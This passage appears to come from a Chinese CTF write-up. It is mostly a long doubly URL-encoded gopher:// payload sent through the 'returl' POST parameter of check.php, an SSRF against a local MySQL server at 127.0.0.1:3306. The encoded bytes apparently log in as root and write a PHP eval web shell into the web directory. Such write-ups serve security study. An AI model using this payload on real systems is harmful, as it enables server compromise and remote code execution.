class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">33</span>%<span class="hljs-number">62</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>经过BP抓包确定路径为check.php，参数为returl，POST传参</p><p>发送</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">returl</span>=gopher://<span class="hljs-number">127.0.0.1:3306</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">38</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">61</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">35</span>%<span class="hljs-number">66</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">39</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">36</span>%<span 